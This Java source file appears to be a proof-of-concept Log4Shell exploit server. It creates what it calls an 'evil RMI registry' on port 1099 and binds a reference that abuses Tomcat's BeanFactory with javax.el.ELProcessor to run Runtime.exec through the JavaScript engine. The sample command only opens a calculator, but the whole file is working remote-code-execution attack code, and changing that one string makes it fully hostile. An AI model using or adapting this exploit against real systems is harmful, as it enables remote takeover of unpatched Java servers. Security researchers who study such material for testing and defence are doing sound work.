package com.log4j.exploit.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {

    private static final String COMMAND_MAC = "open -a Calculator";
    private static final String COMMAND_WIN = "calc.exe";

    private ReferenceWrapper execByEL() throws RemoteException, NamingException {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        String command = (System.getProperty("os.name").contains("Windows")) ? COMMAND_WIN : COMMAND_MAC;
        String addr = String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")", command);
        ref.add(new StringRefAddr("x", addr));

        return new ReferenceWrapper(ref);
    }

    public static void main(String[] args) throws Exception {

        System.out.println("Creating evil RMI registry on port 1099");
        Registry registry = LocateRegistry.createRegistry(1099);

        RmiServer rmiServer = new RmiServer();
        System.out.println("Bind remote exploit to 'ExecByEL' ");
        registry.bind("ExecByEL", rmiServer.execByEL());
    }
}
